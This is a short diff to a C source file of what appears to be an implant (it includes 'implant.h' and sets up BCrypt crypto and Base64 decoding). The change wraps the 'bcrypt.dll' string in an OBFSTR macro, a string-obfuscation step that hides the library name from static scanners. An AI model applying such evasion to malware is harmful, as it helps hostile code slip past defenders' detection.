@@ -14,6 +14,7 @@
  * Base64 standard alphabet.
  */
 #include "../include/implant.h"
+#include "../include/obfstr.h"
 #include <string.h>
 
 /* ── BCrypt function pointers ────────────────────────────────────────────── */
@@ -162,7 +163,7 @@ int Base64Decode(const char *in, int inLen, BYTE *out, int outCap) {
 
 /* ── BCrypt init ──────────────────────────────────────────────────────────── */
 BOOL CryptoInit(void) {
-    HMODULE hB = LoadLibraryA("bcrypt.dll");
+    HMODULE hB = LoadLibraryA(OBFSTR("bcrypt.dll"));
     if (!hB) return FALSE;
 
 #define RESOLVE(var, name) \
